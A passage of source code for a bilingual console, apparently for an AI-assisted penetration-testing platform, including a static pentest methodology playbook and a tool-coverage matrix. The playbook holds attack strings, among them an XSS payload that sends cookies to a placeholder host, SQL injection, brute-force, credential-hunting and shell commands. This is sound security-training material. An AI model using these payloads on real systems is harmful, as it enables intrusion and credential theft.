/* Dagger-AI console controller (vanilla JS, no build step).
   Bilingual (I18N), themeable (Theme), AI pentest + LLM/web red-team, with a
   live engagement monitor and runtime LLM configuration. */
const S = { token: localStorage.getItem("dagger_token") || "", meta: null,
            view: "dashboard", pollTimer: null };
const $ = s => document.querySelector(s);
const main = () => $("#main");
const t = (k, v) => I18N.t(k, v);
const esc = s => (s ?? "").toString().replace(/[&<>"]/g, c =>
  ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
const zh = () => I18N.getLang() === "zh";

/* ---------- safe markdown → HTML (for LLM-authored text) ----------
   The operator/judge emit markdown (**bold**, lists, [severity] tags). We escape
   first (never trust LLM output as HTML), then render a conservative subset so it
   reads as a report instead of raw asterisks. */
function mdInline(s) {
  return s
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\[(critical|high|medium|low|info)\]/gi,
             (_, g) => `<span class="badge sev-${g.toLowerCase()}">${g.toLowerCase()}</span>`)
    .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
    .replace(/(^|[^*])\*([^*\n]+)\*(?!\*)/g, '$1<em>$2</em>');
}
function mdToHtml(src) {
  const text = esc(src || "").trim();
  if (!text) return "";
  let html = "", list = null, para = [];
  const closeList = () => { if (list) { html += `</${list}>`; list = null; } };
  const flushPara = () => { if (para.length) { html += `<p>${mdInline(para.join(" "))}</p>`; para = []; } };
  for (const raw of text.split(/\r?\n/)) {
    const line = raw.replace(/\s+$/, "");
    if (!line.trim()) { flushPara(); closeList(); continue; }
    let m;
    if ((m = line.match(/^\s{0,3}(#{1,4})\s+(.*)$/))) {
      flushPara(); closeList();
      html += `<p class="md-h md-h${Math.min(m[1].length, 4)}">${mdInline(m[2])}</p>`;
    } else if ((m = line.match(/^\s*[-*•]\s+(.*)$/))) {
      flushPara(); if (list !== "ul") { closeList(); html += "<ul>"; list = "ul"; }
      html += `<li>${mdInline(m[1])}</li>`;
    } else if ((m = line.match(/^\s*\d+[.)]\s+(.*)$/))) {
      flushPara(); if (list !== "ol") { closeList(); html += "<ol>"; list = "ol"; }
      html += `<li>${mdInline(m[1])}</li>`;
    } else { closeList(); para.push(line.trim()); }
  }
  flushPara(); closeList();
  return html;
}

/* ---------- localized lookups over meta ---------- */
const probeName = p => (zh() && p.name_zh) ? p.name_zh : p.name;
const probeDesc = p => (zh() && p.description_zh) ? p.description_zh : p.description;
const moduleName = m => (zh() && m.name_zh) ? m.name_zh : m.name;
const strategyLabel = k => (zh() ? (S.meta.strategies_zh||{})[k] : (S.meta.strategies||{})[k]) || k;
const phaseLabel = p => (zh() ? (S.meta.phases_zh||{})[p] : p) || p;
function owaspLabel(code) {
  const m = zh() ? {...S.meta.owasp_llm_zh, ...S.meta.owasp_web_zh}
                 : {...S.meta.owasp_llm, ...S.meta.owasp_web};
  return m[code] || code;
}
const sevLabel = s => (zh() ? (S.meta.severity_zh||{})[s] : s) || s;
/* CVSS score + CWE chips for a finding (only shown when scored/classified). */
const cvssNum = f => { const v = f && f.cvss; return (typeof v === "number" ? v : parseFloat(v)) || 0; };
const cvssChip = f => { const v = cvssNum(f); return v > 0
  ? `<span class="badge cvss cvss-${cvssBand(v)}" title="CVSS v3.1 base score">CVSS ${v.toFixed(1)}</span>` : ""; };
const cweChip = f => (f && f.cwe) ? `<span class="tag cwe">${esc(f.cwe)}</span>` : "";
const cvssBand = v => v>=9?"critical":v>=7?"high":v>=4?"medium":v>0?"low":"info";
const statusLabel = s => t("status." + s);
const fmtDate = ts => ts ? new Date(ts + "Z").toLocaleString(zh() ? "zh-CN" : undefined) : "";

async function api(path, opts = {}) {
  const r = await fetch("/api" + path, {
    ...opts,
    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + S.token,
               ...(opts.headers || {}) },
  });
  if (r.status === 401) { logout(); throw new Error("unauthorized"); }
  if (!r.ok) { const e = await r.json().catch(()=>({detail:r.statusText})); throw new Error(e.detail || "error"); }
  return r.status === 204 ? null : r.json();
}
function toast(msg) { const el = $("#toast"); el.textContent = msg; el.classList.remove("hidden");
  clearTimeout(el._t); el._t = setTimeout(() => el.classList.add("hidden"), 2600); }

/* ---------- i18n + controls ---------- */
function applyI18n() {
  document.querySelectorAll("[data-i18n]").forEach(e => e.textContent = t(e.dataset.i18n));
  $("#l-subtitle").textContent = t("login.subtitle");
  $("#l-legal").textContent = t("login.legal");
  $("#l-signin").textContent = t("login.signin");
  $("#l-user").placeholder = t("login.user");
  $("#l-pass").placeholder = t("login.pass");
  buildLoginLang();
}
function seg(id, items, onPick) {
  const box = $(id); if (!box) return;
  box.innerHTML = items.map(it =>
    `<a data-k="${it.key}" class="${it.active ? "on" : ""}">${esc(it.label)}</a>`).join("");
  box.querySelectorAll("a").forEach(a => a.onclick = () => onPick(a.dataset.k));
}
function buildLoginLang() {
  const box = $("#l-lang"); if (!box) return;
  box.innerHTML = [["en","EN"],["zh","中文"]].map(([k,l]) =>
    `<a data-k="${k}" class="${I18N.getLang()===k?"on":""}">${l}</a>`).join("");
  box.querySelectorAll("a").forEach(a => a.onclick = () => { I18N.setLang(a.dataset.k); applyI18n(); });
}
function buildControls() {
  seg("#seg-lang", [{key:"en",label:"EN",active:I18N.getLang()==="en"},
                    {key:"zh",label:"中",active:I18N.getLang()==="zh"}],
      k => { I18N.setLang(k); applyI18n(); buildControls(); refreshAttackerPill(); show(S.view); });
  const selT=$("#sel-theme");
  selT.innerHTML=Theme.THEMES.map(x=>`<option value="${x}" ${Theme.getTheme()===x?"selected":""}>${t("theme."+x)}</option>`).join("");
  selT.onchange=()=>{ Theme.setTheme(selT.value); show(S.view); };
  const selF=$("#sel-font");
  selF.innerHTML=Theme.FONTS.map(x=>`<option value="${x}" ${Theme.getFont()===x?"selected":""}>${t("font."+x)}</option>`).join("");
  selF.onchange=()=>{ Theme.setFont(selF.value); };
}
function refreshAttackerPill() {
  const on = S.meta && ((S.meta.llm && S.meta.llm.online) || S.meta.attacker_online);
  const el = $("#attacker-mode");
  el.textContent = on ? "⚡ " + t("side.attackerOnline") : "◇ " + t("side.offline");
  el.classList.toggle("on", !!on);
}

/* ---------- auth ---------- */
$("#login-form").addEventListener("submit", async e => {
  e.preventDefault();
  try {
    const d = await (await fetch("/api/login", { method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ user: $("#l-user").value, password: $("#l-pass").value }) })).json();
    if (!d.token) throw new Error();
    S.token = d.token; localStorage.setItem("dagger_token", d.token); boot();
  } catch { $("#login-err").textContent = t("login.err"); }
});
function logout() { S.token = ""; localStorage.removeItem("dagger_token");
  clearInterval(S.pollTimer); $("#app").classList.add("hidden"); $("#login").classList.remove("hidden"); }
$("#logout").addEventListener("click", logout);

async function boot() {
  try { S.meta = await api("/meta"); } catch { return logout(); }
  $("#login").classList.add("hidden"); $("#app").classList.remove("hidden");
  $("#ver").textContent = S.meta.version || "1.0.0";
  applyI18n(); buildControls(); refreshAttackerPill();
  show(S.view);
}
document.querySelectorAll("nav a").forEach(a =>
  a.addEventListener("click", () => show(a.dataset.view)));

function show(view) {
  S.view = view; clearInterval(S.pollTimer); closeDrawer();
  // The Live Monitor is a wall-board: let it break out of the reading-width cap
  // and use the full horizontal space; every other view stays measured.
  main().classList.toggle("wide", view === "monitor");
  document.querySelectorAll("nav a").forEach(x => x.classList.toggle("active", x.dataset.view === view));
  ({ dashboard: viewDashboard, targets: viewTargets, campaigns: viewCampaigns,
     playbook: viewPlaybook,
     runs: viewRuns, monitor: viewMonitor, settings: viewSettings }[view] || viewDashboard)();
}

/* ---------- Playbook: penetration-testing methodology map ----------
   A 7-phase attack chain (PTES spine, cross-referenced to NIST SP 800-115,
   Cyber Kill Chain and MITRE ATT&CK). Static reference content, bilingual via zh(). */
const PB_FW = [
  ["1 · Pre-engagement","1 · 前期交互","Pre-engagement","Planning","—","—"],
  ["2 · Recon (passive)","2 · 信息收集(被动)","Intelligence Gathering","Discovery","Reconnaissance","TA0043 Recon"],
  ["3 · Enumeration (active)","3 · 枚举与扫描(主动)","Intelligence Gathering","Discovery","Weaponization · Delivery","TA0043 · TA0007"],
  ["4 · Threat model & vuln analysis","4 · 威胁建模 & 漏洞分析","Threat Modeling · Vuln Analysis","Discovery","Exploitation (prep)","—"],
  ["5 · Exploitation","5 · 漏洞利用","Exploitation","Attack","Exploitation · Installation","TA0001 · TA0002"],
  ["6 · Post-exploitation","6 · 后渗透","Post-Exploitation","Attack","C2 · Actions on Objectives","TA0004·06·08·03·11"],
  ["7 · Reporting","7 · 报告","Reporting","Reporting","—","—"],
];
const PB_PHASES = [
  { n:"01", id:"pre", kind:"exec", en:"Pre-engagement", zh:"前期交互",
    subEn:"Scope · rules · authorization", subZh:"范围、规则、授权 —— 一切的前提",
    goalEn:"Before touching any system, lock down scope, rules of engagement and written authorization; set goals and the threat model. The gap your notes didn't cover — but authoritative process requires.",
    goalZh:"在接触任何系统之前,敲定测试范围、交战规则与书面授权,设定目标与威胁模型。这是笔记未覆盖、但权威流程不可或缺的一环。",
    tags:["PTES Pre-engagement","NIST Planning"],
    tasks:[
      {k:"1.1",en:"Scoping",zh:"范围界定",tools:["scope worksheet","asset list",{en:"IP/CIDR list",zh:"IP/CIDR 清单"}]},
      {k:"1.2",en:"Rules of Engagement",zh:"交战规则",tools:[{en:"RoE doc",zh:"RoE 文档"},{en:"test window",zh:"测试时间窗"},{en:"no-go list",zh:"禁测清单"}]},
      {k:"1.3",en:"Written authorization",zh:"书面授权",tools:[{en:"authorization letter",zh:"授权书"},{en:"contract / SOW",zh:"合同 / SOW"},{en:"emergency contact",zh:"应急联系人"}]},
      {k:"1.4",en:"Goals & threat model",zh:"目标与威胁建模",tools:[{en:"business goals",zh:"业务目标"},{en:"data classification",zh:"数据分级"},{en:"attacker profile",zh:"攻击者画像"}]},
    ]},
  { n:"02", id:"osint", kind:"recon", flag:"passive", en:"Information Gathering", zh:"信息收集",
    subEn:"Passive OSINT · no contact", subZh:"被动 OSINT · 不接触目标系统",
    goalEn:"Collect as much public information as possible without touching the target: domains, subdomains, certificates, tech stack, exposed assets and people.",
    goalZh:"在不直接触碰目标的前提下,尽可能多地收集公开信息:域名、子域、证书、技术栈、暴露资产与人员情报。",
    tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0043 Recon"],
    tasks:[
      {k:"2.1",en:"WHOIS / DNS",zh:"WHOIS / DNS 情报",tools:["whois","nslookup","dig","dnsx","dnsrecon","DNSDumpster"],
        cmds:["whois tryhackme.com","dig tryhackme.com A / MX / TXT","nslookup -type=MX tryhackme.com 1.1.1.1"]},
      {k:"2.2",en:"Subdomain enum",zh:"子域枚举",tools:["crt.sh","subfinder","Sublist3r","theHarvester","amass"],
        cmds:["./sublist3r.py -d acmeitsupport.thm","crt.sh  # certificate transparency logs"]},
      {k:"2.3",en:"Search-engine dorking",zh:"搜索引擎 / Dorking",tools:["site:","inurl:","filetype:","intitle:","Wayback","GitHub"],
        cmds:["site:target.com filetype:pdf","inurl:admin  ·  intitle:admin"]},
      {k:"2.4",en:"Tech fingerprint",zh:"技术栈指纹",tools:["Wappalyzer","whatweb","httpx","BuiltWith"]},
      {k:"2.5",en:"Exposure & people",zh:"暴露资产 / 人员",tools:["Shodan","Censys","Maltego","theHarvester"]},
    ]},
  { n:"03", id:"enum", kind:"recon", flag:"active", en:"Enumeration & Scanning", zh:"枚举与扫描",
    subEn:"Active probing · hosts, ports, services, content", subZh:"主动探测 · 存活主机、端口、服务、内容",
    goalEn:"Actively interact with the target to find live hosts, open ports, running services/versions, hidden directories and virtual hosts — the attack-surface map.",
    goalZh:"主动与目标交互,发现存活主机、开放端口、运行服务与版本、隐藏目录与虚拟主机,为漏洞分析建立攻击面地图。",
    tags:["PTES Intelligence Gathering","NIST Discovery","ATT&CK TA0007 Discovery"],
    tasks:[
      {k:"3.1",en:"Host discovery",zh:"主机发现",tools:["nmap -sn","ping","traceroute","arp"],
        cmds:["nmap -sn 10.10.0.0/24  # ARP/ICMP/TCP/UDP","traceroute / tracert <target>"]},
      {k:"3.2",en:"Port scanning",zh:"端口扫描",tools:["nmap -sS","-sT","-sU","-sN/-sF/-sX","-sA/-sW","naabu","masscan"],
        cmds:["sudo nmap -sS $IP   # SYN (default)","sudo nmap -sU $IP   # UDP","sudo nmap -sN/-sF/-sX $IP  # stealth"]},
      {k:"3.3",en:"Service / OS detection",zh:"服务与 OS 识别",tools:["nmap -sV","-O","-A","whatweb","httpx"],
        cmds:["nmap -sV --version-light $IP","nmap -A $IP   # -sV -O -sC --traceroute"]},
      {k:"3.4",en:"Content discovery",zh:"内容发现",tools:["ffuf","katana","gau","gobuster","dirb","SecLists","favicon hash","sitemap.xml","curl -v"],
        cmds:["ffuf -w SecLists/... -u http://$IP/FUZZ","curl http://$IP -v   # Server / lang headers"]},
      {k:"3.5",en:"Virtual-host fuzzing",zh:"虚拟主机 VHost",tools:["ffuf -H Host:"],
        cmds:["ffuf -w namelist.txt -H \"Host: FUZZ.site.thm\" -u http://$IP -fs {size}"]},
      {k:"3.6",en:"Web vuln scan",zh:"Web 漏洞扫描",tools:["nuclei","nikto"]},
      {k:"3.7",en:"TLS / SSL review",zh:"TLS/SSL 核查",tools:["sslscan","testssl.sh","tlsx"],
        cmds:["sslscan --no-colour host:443","testssl.sh --fast host  # Heartbleed / weak ciphers / cert","tlsx -u host:443 -expired -self-signed -mismatched"]},
    ]},
  { n:"04", id:"vuln", kind:"exec", en:"Threat Modeling & Vuln Analysis", zh:"威胁建模 · 漏洞分析",
    subEn:"Map findings to attack paths, confirm vulns", subZh:"把发现映射成攻击路径,识别并确认漏洞",
    goalEn:"Rank the attack surface by threat value, classify root causes, confirm exploitability with automated + manual methods, and weigh risk with vuln intelligence.",
    goalZh:"将攻击面上的发现按威胁价值排序,分类漏洞成因,用自动化+手动手段确认其可利用性,并结合漏洞情报评估风险。",
    tags:["PTES Threat Modeling · Vuln Analysis","NIST Discovery","OWASP WSTG / API Top 10"],
    tasks:[
      {k:"4.1",en:"Vulnerability classes",zh:"漏洞成因归类",tools:["OS",{en:"Misconfiguration",zh:"配置错误"},{en:"Weak/default creds",zh:"弱口令/默认凭证"},{en:"App logic",zh:"应用逻辑"},{en:"Human factor",zh:"人因"}]},
      {k:"4.2",en:"Automated scanning",zh:"自动化漏扫",tools:["Nessus","OpenVAS","nuclei"]},
      {k:"4.3",en:"Manual proxy analysis",zh:"手动验证 / 代理",tools:["Burp Suite","Proxy","Repeater"]},
      {k:"4.4",en:"Vuln intel & scoring",zh:"漏洞情报 & 评分",tools:["NVD","Exploit-DB","searchsploit","CVSS","VPR"],
        cmds:["searchsploit apache 2.4","NVD / Exploit-DB  # check CVE & PoC"]},
      {k:"4.5",en:"OWASP mapping",zh:"OWASP 对照",tools:[{en:"WSTG 12 categories",zh:"WSTG 12 类"},"API Top 10","BOLA/IDOR","BUA",{en:"Broken func-level authz",zh:"功能级授权缺陷"}]},
    ]},
  { n:"05", id:"exploit", kind:"exec", flag:"active", en:"Exploitation", zh:"漏洞利用",
    subEn:"Gain a foothold (benign PoC first)", subZh:"利用已确认漏洞获取立足点(良性 PoC 优先)",
    goalEn:"Launch controlled exploitation of confirmed vulns to gain initial access. Prefer benign, reversible proofs-of-concept; record the exact payload, result and evidence.",
    goalZh:"对已确认的漏洞发起受控利用,取得初始访问 / foothold。优先使用良性、可回滚的概念验证,记录确切 payload、结果与证据。",
    tags:["PTES Exploitation","NIST Attack","ATT&CK TA0001 Initial Access · TA0002 Execution"],
    tasks:[
      {k:"5.1",en:"Auth bypass",zh:"认证绕过",tools:[{en:"ffuf (enum/brute)",zh:"ffuf (枚举/爆破)"},"Hydra","CrackStation",{en:"logic flaws",zh:"逻辑缺陷"}],
        cmds:["ffuf -w names.txt -d \"username=FUZZ...\" -mr \"already exists\"","hydra -l user -P wordlist.txt $IP service"]},
      {k:"5.2",en:"SQL injection",zh:"SQL 注入",tools:["sqlmap","Burp","UNION-based","Error-based"],
        cmds:["0 UNION SELECT 1,2,database()","UNION SELECT ...group_concat(table_name) FROM information_schema.tables"]},
      {k:"5.3",en:"Command injection",zh:"命令注入",tools:["commix","whoami/ls/dir","ping/sleep/timeout","nc","OS_Command_Payload_List"]},
      {k:"5.4",en:"XSS (Reflected/Stored/DOM/Blind)",zh:"跨站脚本 XSS",tools:["dalfox","XSS Hunter","polyglot payloads"],
        cmds:["<script>fetch('http://IP:PORT?c='+btoa(document.cookie))</script>"]},
      {k:"5.5",en:"File inclusion LFI/RFI",zh:"文件包含 LFI/RFI",tools:[{en:"../ traversal",zh:"../ 路径穿越"},"%00","php wrappers","php reverse shell"]},
      {k:"5.6",en:"SSRF · IDOR · Race",zh:"SSRF · IDOR · 竞争条件",tools:[{en:"Burp Repeater (parallel)",zh:"Burp Repeater (并行)"},{en:"param tampering",zh:"参数篡改"},{en:"id enumeration",zh:"id 遍历"}]},
      {k:"5.7",en:"Payloads & frameworks",zh:"载荷 & 利用框架",tools:["Metasploit","msfvenom","PayloadsAllTheThings","PentestMonkey"]},
    ]},
  { n:"06", id:"post", kind:"exec", flag:"active", en:"Post-Exploitation", zh:"后渗透",
    subEn:"Stabilize · escalate · creds · lateral · cleanup", subZh:"稳固 shell · 提权 · 凭证 · 横向 · 清理",
    goalEn:"Expand from the foothold: stabilize an interactive shell, escalate vertically/horizontally, harvest credentials, pivot into the network, then cover tracks. Spans several ATT&CK tactics.",
    goalZh:"在立足点之上扩大战果:稳定交互式 shell,纵向/横向提权,搜集凭证,枢纽转发到内网,最后清理痕迹。对应 ATT&CK 多个战术。",
    tags:["PTES Post-Exploitation","ATT&CK TA0004 PrivEsc","TA0006 Creds","TA0008 Lateral","TA0003 Persistence"],
    tasks:[
      {k:"6.1",en:"Shell stabilization",zh:"Shell 获取与稳定",tools:["netcat","socat","Python PTY","rlwrap","stty","Meterpreter"],
        cmds:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","stty raw -echo; fg  ·  export TERM=xterm","socat OPENSSL-LISTEN:53,cert=x.pem,verify=0 ..."]},
      {k:"6.2",en:"Listeners & handlers",zh:"监听 / 处理器",tools:["nc -lvnp","socat","msf multi/handler"],
        cmds:["nc -lvnp PORT  ·  rlwrap nc -lvnp PORT","msf → multi/handler  # staged / Meterpreter"]},
      {k:"6.3",en:"Linux PrivEsc",zh:"Linux 提权",tools:["LinPEAS","SUID","sudo -l","cron","capabilities"]},
      {k:"6.4",en:"Windows PrivEsc",zh:"Windows 提权",tools:["WinPEAS","PrivescCheck","WES-NG","local_exploit_suggester"],
        cmds:["winpeas.exe > out.txt","wes.py systeminfo.txt  # offline / low-noise"]},
      {k:"6.5",en:"Credential hunting",zh:"Windows 凭证搜集",tools:["Unattend.xml","PowerShell history","cmdkey/runas","web.config","PuTTY reg","Scheduled Tasks","AlwaysInstallElevated","Mimikatz"],
        cmds:["cmdkey /list → runas /savecred /user:admin cmd","reg query HKCU\\...\\PuTTY\\Sessions /f Proxy /s"]},
      {k:"6.6",en:"Lateral · pivot · cleanup",zh:"横向移动 / 枢纽 · 清理",tools:["pivoting",{en:"port forwarding",zh:"端口转发"},"covering tracks"]},
    ]},
  { n:"07", id:"report", kind:"exec", en:"Reporting", zh:"报告",
    subEn:"Deliver actionable findings & fixes", subZh:"交付可执行的发现与修复建议",
    goalEn:"Turn the whole engagement into something the client can act on: risk-ranked findings, reproducible evidence, prioritized remediation, and a retest where needed.",
    goalZh:"把整个过程转化为客户能行动的成果:按风险排序的发现、可复现证据、分优先级的修复建议,必要时复测验证。",
    tags:["PTES Reporting","NIST Reporting"],
    tasks:[
      {k:"7.1",en:"Findings & evidence",zh:"发现归档 & 证据",tools:[{en:"PoC screenshots",zh:"PoC 截图"},{en:"request/response capture",zh:"请求/响应留存"},{en:"repro steps",zh:"复现步骤"}]},
      {k:"7.2",en:"Risk rating",zh:"风险评级",tools:["CVSS",{en:"business impact",zh:"业务影响"},{en:"likelihood × impact",zh:"可能性×影响"}]},
      {k:"7.3",en:"Remediation",zh:"修复建议",tools:["Prepared Statements",{en:"input validation",zh:"输入校验"},"WAF",{en:"timely patching",zh:"及时打补丁"},{en:"least privilege",zh:"最小权限"}]},
      {k:"7.4",en:"Report & retest",zh:"报告撰写 & 复测",tools:["SysReptor","Dradis","Serpico",{en:"template",zh:"模板"},"Retest"]},
    ]},
];

/* ---------- Tool coverage: every tool in this methodology, and whether
   Dagger-AI integrates it — with the reason when it doesn't. [phase, name,
   status, en-note, zh-note]. status: in=integrated · cov=covered by another
   integrated tool · cand=candidate (could add next) · no=not integrated. */
const PB_TOOLS = [
  ["pre","Scoping · RoE · authorization","no","Process, not a binary — enforced by the platform's authorization gate (no campaign runs without an authorization note).","流程而非工具 —— 由平台的授权门禁强制：没有授权说明就无法发起战役。"],

  ["osint","subfinder","in","Sidecar — passive subdomain enumeration.","sidecar —— 被动子域枚举。"],
  ["osint","theHarvester","in","Sidecar — emails & subdomains from crt.sh / otx / bing…","sidecar —— 从 crt.sh / otx / bing 等聚合邮箱与子域。"],
  ["osint","dnsx","in","Sidecar — DNS resolution & records.","sidecar —— DNS 解析与记录。"],
  ["osint","gau","in","Sidecar — historical URL discovery.","sidecar —— 历史 URL 发现。"],
  ["osint","crt.sh (CT logs)","cov","Covered — queried through theHarvester's crtsh source.","已覆盖 —— 经 theHarvester 的 crtsh 源查询。"],
  ["osint","Wappalyzer / BuiltWith","cov","Covered — whatweb + httpx tech detection.","已覆盖 —— whatweb + httpx 技术识别。"],
  ["osint","amass","cand","Candidate — deeper subdomain/asset mapping; a natural next addition.","候选 —— 更深的子域/资产测绘；适合作为下一个补充。"],
  ["osint","Shodan / Censys","no","Needs a paid API key; an external data source rather than an active tool.","需付费 API key；属外部数据源而非主动工具。"],
  ["osint","Maltego","no","GUI, analyst-driven graph analysis — not automatable headless.","图形化、依赖分析师的图谱分析 —— 无法无头自动化。"],
  ["osint","Search-engine dorking","no","Manual query craft; no stable API to drive.","人工构造查询；没有稳定 API 可驱动。"],

  ["enum","nmap","in","Sidecar — ports + service/version detection.","sidecar —— 端口 + 服务/版本识别。"],
  ["enum","naabu","in","Sidecar — fast top-1000 TCP port discovery. (added this round)","sidecar —— 快速 top-1000 TCP 端口发现。（本次新增）"],
  ["enum","httpx","in","Sidecar — web probe / tech detect.","sidecar —— Web 探测 / 技术识别。"],
  ["enum","ffuf","in","Sidecar — content & virtual-host discovery.","sidecar —— 内容与虚拟主机发现。"],
  ["enum","katana","in","Sidecar — crawl / URL discovery.","sidecar —— 爬取 / URL 发现。"],
  ["enum","wafw00f","in","Sidecar — WAF detection.","sidecar —— WAF 检测。"],
  ["enum","nikto","in","Sidecar — web-server scan.","sidecar —— Web 服务器扫描。"],
  ["enum","masscan","cov","Covered — naabu provides the fast port sweep.","已覆盖 —— naabu 提供快速端口扫描。"],
  ["enum","gobuster / dirb","cov","Covered — ffuf handles content discovery.","已覆盖 —— 由 ffuf 负责内容发现。"],

  ["analysis","nuclei","in","Sidecar — templated CVE / misconfig scan.","sidecar —— 模板化 CVE / 配置扫描。"],
  ["analysis","searchsploit","in","Sidecar — Exploit-DB intel from detected product/versions. (added this round)","sidecar —— 由识别到的产品/版本查 Exploit-DB。（本次新增）"],
  ["analysis","tlsx","in","Sidecar — TLS fingerprint & certificate hygiene. (added this round)","sidecar —— TLS 指纹与证书核查。（本次新增）"],
  ["analysis","sslscan / testssl.sh","in","Sidecar — TLS protocol/cipher & known TLS vulns.","sidecar —— TLS 协议/套件与已知 TLS 漏洞。"],
  ["analysis","wpscan","in","Sidecar — WordPress core/plugin/theme vulns.","sidecar —— WordPress 核心/插件/主题漏洞。"],
  ["analysis","arjun","in","Sidecar — hidden-parameter discovery.","sidecar —— 隐藏参数发现。"],
  ["analysis","git / secret scan","in","Sidecar — exposed .git → git-dumper + gitleaks/trufflehog.","sidecar —— 暴露 .git → git-dumper + gitleaks/trufflehog。"],
  ["analysis","Nessus","no","Commercial, licensed, heavyweight appliance.","商业授权、重型设备。"],
  ["analysis","OpenVAS","no","Heavyweight deployment; against the lightweight self-hosted model.","部署重；不符合轻量自托管模型。"],
  ["analysis","Burp Suite","no","Interactive proxy, analyst-driven; not headless-automatable.","交互式代理、依赖人工；无法无头自动化。"],

  ["exploit","Built-in web probes","in","In-process OWASP probes (SQLi / cmdi / SSRF / XSS / IDOR…).","进程内 OWASP 探针（SQLi / 命令注入 / SSRF / XSS / IDOR…）。"],
  ["exploit","sqlmap","in","Sidecar — SQL-injection validation.","sidecar —— SQL 注入验证。"],
  ["exploit","dalfox","in","Sidecar — XSS validation.","sidecar —— XSS 验证。"],
  ["exploit","commix","in","Sidecar — command-injection validation.","sidecar —— 命令注入验证。"],
  ["exploit","OWASP ZAP","in","Sidecar — automated DAST.","sidecar —— 自动化 DAST。"],
  ["exploit","Hydra / medusa","cand","Candidate — credential brute-forcing; noisy & higher-risk, planned behind an explicit opt-in.","候选 —— 认证爆破；噪声大、风险高，计划做成显式开关。"],
  ["exploit","Metasploit / msfvenom","no","Weaponized exploitation framework; by design the platform stops at a benign PoC → foothold, not weaponized payloads.","武器化利用框架；平台按设计只做良性 PoC 到立足点，不做武器化载荷。"],
  ["exploit","CrackStation / online crackers","no","External online service.","外部在线服务。"],

  ["post","LinPEAS / WinPEAS","no","Needs an interactive shell on a compromised host — beyond the PoC-to-foothold scope.","需在已拿下的主机上有交互式 shell —— 超出 PoC-到-立足点 的范围。"],
  ["post","Mimikatz","no","Post-compromise credential theft; out of scope.","拿下后的凭证窃取；范围外。"],
  ["post","Pivoting / C2","no","The platform does not establish persistent command-and-control.","平台不建立持久 C2。"],

  ["report","SysReptor / Dradis / Serpico","cov","Covered — the platform generates its own risk-ranked report.","已覆盖 —— 平台自带按风险排序的报告生成。"],
];

const PB_TOOL_PHASES = [
  ["pre","Pre-engagement","前期交互"], ["osint","Recon (OSINT)","信息收集"],
  ["enum","Enumeration","枚举与扫描"], ["analysis","Vuln analysis","漏洞分析"],
  ["exploit","Exploitation","漏洞利用"], ["post","Post-exploitation","后渗透"],
  ["report","Reporting","报告"],
];
const PB_TOOL_ST = {
  in:   {cls:"ok",   en:"Integrated",     zh:"已集成"},
  cov:  {cls:"ok",   en:"Covered",        zh:"已覆盖"},
  cand: {cls:"cand", en:"Candidate",      zh:"候选"},
  no:   {cls:"no",   en:"Not integrated", zh:"未集成"},
};

function pbToolsHTML(){
  const nIn = PB_TOOLS.filter(t=>t[2]==="in"||t[2]==="cov").length;
  const legend = Object.entries(PB_TOOL_ST).map(([k,v])=>
    `<span><span class="pb-st ${v.cls}">${zh()?v.zh:v.en}</span></span>`).join("");
  const groups = PB_TOOL_PHASES.map(([pid,pen,pzh])=>{
    const rows = PB_TOOLS.filter(t=>t[0]===pid).map(([_,name,st,en,zhn])=>{
      const s = PB_TOOL_ST[st];
      return `<div class="pb-cov-row">
        <span class="pb-st ${s.cls}">${zh()?s.zh:s.en}</span>
        <span class="pb-cov-name">${esc(name)}</span>
        <span class="pb-cov-note">${esc(zh()?zhn:en)}</span></div>`;
    }).join("");
    return rows ? `<div class="pb-cov-g"><h3>${esc(zh()?pzh:pen)}</h3>${rows}</div>` : "";
  }).join("");
  const title = zh()?"工具覆盖矩阵":"Tool coverage";
  const lead = zh()
    ? `本图谱涉及的全部工具及其在 Dagger-AI 的集成状态：已集成 / 已覆盖 ${nIn} 项，其余标注未集成的原因。`
    : `Every tool in this methodology and its status in Dagger-AI: ${nIn} integrated or covered, the rest annotated with why not.`;
  return `<div class="pb-cov">
    <h2>${title}</h2><p class="lead2">${lead}</p>
    <div class="pb-cov-legend">${legend}</div>
    ${groups}</div>`;
}

function pbTaskHTML(tk){
  const title = zh() ? tk.zh : tk.en, sub = zh() ? tk.en : tk.zh;
  const tools = (tk.tools||[]).map(x=>{
    const label = (typeof x === "string") ? x : (zh() ? x.zh : x.en);
    return `<span class="pb-tool">${esc(label)}</span>`;
  }).join("");
  const cmds = (tk.cmds||[]).map(c=>`<div class="pb-cmd">${esc(c)}</div>`).join("");
  return `<div class="pb-task">
    <h4><span class="pb-k">${tk.k}</span><span>${esc(title)}</span></h4>
    <div class="pb-te">${esc(sub)}</div>
    <div class="pb-tools">${tools}</div>
    ${cmds ? `<div class="pb-cmds">${cmds}</div>` : ""}
  </div>`;
}

function pbPhaseHTML(p){
  const flag = p.flag==="passive" ? `<span class="pb-flag ok">${zh()?"● 被动 Passive":"● Passive"}</span>`
             : p.flag==="active" ? `<span class="pb-flag warn">${zh()?"● 主动 Active":"● Active"}</span>` : "";
  const tags = p.tags.map(t=>`<span class="pb-chip">${esc(t)}</span>`).join("") + flag;
  return `<div class="pb-phase ${p.kind==="recon"?"recon":""}" id="pb-${p.id}">
    <div class="pb-node">${p.n}</div>
    <div class="pb-card">
      <div class="pb-head" role="button" tabindex="0" aria-expanded="true">
        <div class="pb-tt">
          <div class="pb-en">${esc(zh()?p.zh:p.en)} <span class="pb-en-sub">${esc(zh()?p.en:p.zh)}</span></div>
          <div class="pb-sub">${esc(zh()?p.subZh:p.subEn)}</div>
          <div class="pb-goal">${esc(zh()?p.goalZh:p.goalEn)}</div>
          <div class="pb-tags">${tags}</div>
        </div>
        <svg class="pb-chev" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
      </div>
      <div class="pb-body"><div class="pb-tasks">${p.tasks.map(pbTaskHTML).join("")}</div></div>
    </div>
  </div>`;
}
function viewPlaybook(){
  const title = zh() ? "渗透测试流程图谱" : "Penetration-Testing Playbook";
  const lead = zh()
